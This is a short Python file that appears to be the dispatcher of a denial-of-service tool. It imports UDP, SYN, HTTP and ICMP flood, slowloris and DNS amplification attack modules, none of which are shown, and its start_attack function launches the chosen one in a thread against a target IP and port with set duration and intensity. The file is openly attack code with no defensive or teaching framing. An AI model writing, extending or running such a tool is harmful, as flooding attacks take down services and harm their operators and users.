import threading
import time
from attacks import udp_flood, syn_flood, http_flood, icmp_flood, slowloris, dns_amplification

def start_attack(attack_type, target_ip, target_port, duration, intensity):
    if attack_type == "udp":
        attack_func = udp_flood.attack
    elif attack_type == "syn":
        attack_func = syn_flood.attack
    elif attack_type == "http":
        attack_func = http_flood.attack
    elif attack_type == "icmp":
        attack_func = icmp_flood.attack
    elif attack_type == "slowloris":
        attack_func = slowloris.attack
    elif attack_type == "dns":
        attack_func = dns_amplification.attack

    # Start attack in a new thread
    thread = threading.Thread(target=attack_func, args=(target_ip, target_port, duration, intensity))
    thread.start()

    